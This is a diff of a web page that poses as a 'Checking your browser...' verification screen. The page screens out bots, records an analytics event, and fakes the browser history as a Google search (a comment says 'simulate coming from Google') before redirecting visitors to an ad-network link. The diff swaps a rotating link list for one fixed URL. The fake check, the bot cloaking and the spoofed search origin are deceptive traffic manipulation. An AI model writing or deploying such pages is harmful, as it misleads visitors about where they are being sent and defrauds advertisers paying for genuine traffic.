@@ -2,12 +2,13 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Verifying...</title>
+  <title>Checking your browser...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta name="referrer" content="origin" />
   <style>
     body {
-      margin: 0; padding: 0;
+      margin: 0;
+      padding: 0;
       background: #111;
       color: #fff;
       font-family: Arial, sans-serif;
@@ -31,7 +32,7 @@
     }
   </style>
 
-  <!-- Google Analytics (reemplaza tu ID si cambia) -->
+  <!-- Google Analytics -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-H9VLD02NMS"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
@@ -47,10 +48,7 @@
   <button id="continue-btn" onclick="proceed()">Continue</button>
 
   <script>
-    const links = [
-      "https://www.profitableratecpm.com/m2qmqkqz1?key=4223c6ba65cdbc631d144eacab0bcc2c"
-      // Puedes agregar más enlaces aquí si quieres rotar
-    ];
+    const finalURL = "https://www.profitableratecpm.com/vrnbr8pt?key=67320c384bf7b5f34dbf7369c25f97e9";
 
     const isBot = () => {
       return (
@@ -73,17 +71,15 @@
     }
 
     function proceed() {
-      const target = links[Math.floor(Math.random() * links.length)];
-
-      // Cambiar el historial simula venir desde Google
+      // Simular que viene de Google
       history.replaceState(null, '', 'https://www.google.com/search?q=free+video');
 
       gtag('event', 'redirect', {
         event_category: 'navigation',
-        event_label: target
+        event_label: finalURL
       });
 
-      window.location.href = target;
+      window.location.href = finalURL;
     }
 
     if (isBot()) {
